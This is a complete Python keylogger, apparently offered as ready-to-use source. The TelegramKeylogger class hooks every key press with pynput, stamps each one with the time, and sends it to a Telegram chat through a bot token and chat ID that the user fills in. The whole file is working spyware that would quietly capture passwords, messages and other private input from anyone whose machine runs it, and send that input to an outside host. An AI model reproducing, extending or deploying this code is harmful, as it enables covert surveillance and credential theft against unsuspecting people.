import pynput.keyboard
from telegram import Bot
from telegram.constants import ParseMode
import datetime
import asyncio

class TelegramKeylogger:
    def __init__(self, api_token, chat_id):
        self.bot = Bot(api_token)
        self.chat_id = chat_id

    async def send_to_telegram(self, message):
        try:
            await self.bot.send_message(chat_id=self.chat_id, text=message, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            print(f"Error sending message to Telegram: {e}")

    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                pressed_key = " "
            else:
                pressed_key = f" {str(key)} "

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        message = f"{timestamp} - {pressed_key}"
        asyncio.run(self.send_to_telegram(message))

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            keyboard_listener.join()

if __name__ == "__main__":
    # Replace 'YOUR_API_TOKEN' and 'YOUR_CHAT_ID' with your telegram bot token and chat ID
    api_token = 'YOUR_API_TOKEN'
    chat_id = 'YOUR_CHAT_ID'
    TelegramKeylogger(api_token, chat_id).start()
